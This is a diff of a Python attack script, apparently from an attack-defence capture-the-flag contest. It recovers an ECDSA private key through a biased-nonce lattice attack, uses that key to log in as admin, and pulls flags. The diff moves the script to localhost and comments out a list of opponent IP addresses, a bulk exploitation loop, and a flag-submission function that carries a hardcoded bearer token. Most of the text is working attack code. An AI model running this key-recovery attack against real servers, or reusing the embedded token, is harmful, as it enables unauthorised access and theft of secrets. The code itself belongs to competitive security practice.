@@ -76,16 +76,16 @@ def createDataset(session, inc, url):
         r1, r2, s = ecdsa.bytes_to_sign(sign)
         message = content
         m1, m2 = message[:len(message)//2], message[len(message)//2:]
-        h1 = hashlib.sha256(m1).digest()
-        h2 = hashlib.sha256(m2).digest()
-        z1 = int.from_bytes(h1, byteorder='big') % order
-        z2 = int.from_bytes(h2, byteorder='big') % order
+        h1 = hashlib.sha256(m1).hexdigest()[2:]
+        h2 = hashlib.sha256(m2).hexdigest()[2:]
+        z1 = int(h1, 16) % order
+        z2 = int(h2, 16) % order
         dataset.append([temp, z1, z2, r1, r2, s])
     return dataset
 
 # attack 
 def biasedNonce(dataset, inc):
-    B = 2**201
+    B = 2**250
     p = order
     Zn = Zmod(p)
 
@@ -107,7 +107,7 @@ def main(url):
     try:
         userData = {'username': "user", "password": "user"}
         session = login(userData, url)
-        inc = 80
+        inc = 60
         dataset = createDataset(session, inc, url)
         print("success generate dataset:",len(dataset))
         private = hex(int(biasedNonce(dataset, inc)))[2:]
@@ -118,31 +118,34 @@ def main(url):
     except:
         return None, None
 
-listu = [
-    "http://47.129.153.66:11000",
-    "http://54.255.201.188:11000",
-    "http://47.128.224.208:11000",
-    "http://13.250.57.255:11000",
-    "http://47.129.120.12:11000",
-    "http://52.77.232.211:11000",
-    "http://13.212.110.53:11000",
-    "http://54.254.138.70:11000",
-    "http://54.255.228.54:11000",
-    "http://13.212.239.67:11000"
-]
+flag, private = main('http://localhost:5111')
+print(flag)
 
-import json
+# listu = [
+#     "http://47.129.153.66:11000",
+#     "http://54.255.201.188:11000",
+#     "http://47.128.224.208:11000",
+#     "http://13.250.57.255:11000",
+#     "http://47.129.120.12:11000",
+#     "http://52.77.232.211:11000",
+#     "http://13.212.110.53:11000",
+#     "http://54.254.138.70:11000",
+#     "http://54.255.228.54:11000",
+#     "http://13.212.239.67:11000"
+# ]
 
-def submitFlag(flag):
-    url = 'http://159.223.57.92:5000/api/flag'
-    token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyMzgxOTU5NCwianRpIjoiNTVkYzM0MjQtNzFhNy00OTU3LWFhNTItYzQyZTE4NTgzMzAxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VybmFtZSI6InNlaGFkIn0sIm5iZiI6MTcyMzgxOTU5NCwiY3NyZiI6IjYxMjVkMWI2LTgwYTgtNDEwOC1hNjgyLTY1ZmMwMzQ5NTcwMSIsImV4cCI6MTcyMzkwNTk5NH0.r6vJbs8uxD46PSO-1tJm-zhmcDq1lk_mWQW7dICQEfU'
-    headers = {
-        'Authorization': f'Bearer {token}',
-        'Content-Type': 'application/json'
-    }
-    data = { 'flag': flag  }
-    response = requests.post(url, headers=headers, data=json.dumps(data))
-    return response.json()
+# import json
+
+# def submitFlag(flag):
+#     url = 'http://159.223.57.92:5000/api/flag'
+#     token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyMzgxOTU5NCwianRpIjoiNTVkYzM0MjQtNzFhNy00OTU3LWFhNTItYzQyZTE4NTgzMzAxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VybmFtZSI6InNlaGFkIn0sIm5iZiI6MTcyMzgxOTU5NCwiY3NyZiI6IjYxMjVkMWI2LTgwYTgtNDEwOC1hNjgyLTY1ZmMwMzQ5NTcwMSIsImV4cCI6MTcyMzkwNTk5NH0.r6vJbs8uxD46PSO-1tJm-zhmcDq1lk_mWQW7dICQEfU'
+#     headers = {
+#         'Authorization': f'Bearer {token}',
+#         'Content-Type': 'application/json'
+#     }
+#     data = { 'flag': flag  }
+#     response = requests.post(url, headers=headers, data=json.dumps(data))
+#     return response.json()
 
 # with open("privss.db","wb") as f:
 #     for url in listu:
@@ -150,15 +153,15 @@ def submitFlag(flag):
 #         f.write(url.encode()+b";"+private.encode()+b"\n")
 #         print("get url:",url, "flag:" ,flag)
 
-with open("privss.db","rb") as f:
-    privates = f.readlines()
-    for line in privates:
-        try:
-            url = line.decode().strip().split(";")[0]
-            privkey = line.decode().strip().split(";")[1]
-            adminData = {'username': "admin", "password": privkey}
-            session = login(adminData, url)
-            flag = getFlag(session, privkey, url)
-            print("url:",url,submitFlag(flag))
-        except:
-            print("url:",url,"is down")
+# with open("privss.db","rb") as f:
+#     privates = f.readlines()
+#     for line in privates:
+#         try:
+#             url = line.decode().strip().split(";")[0]
+#             privkey = line.decode().strip().split(";")[1]
+#             adminData = {'username': "admin", "password": privkey}
+#             session = login(adminData, url)
+#             flag = getFlag(session, privkey, url)
+#             print("url:",url,submitFlag(flag))
+#         except:
+#             print("url:",url,"is down")
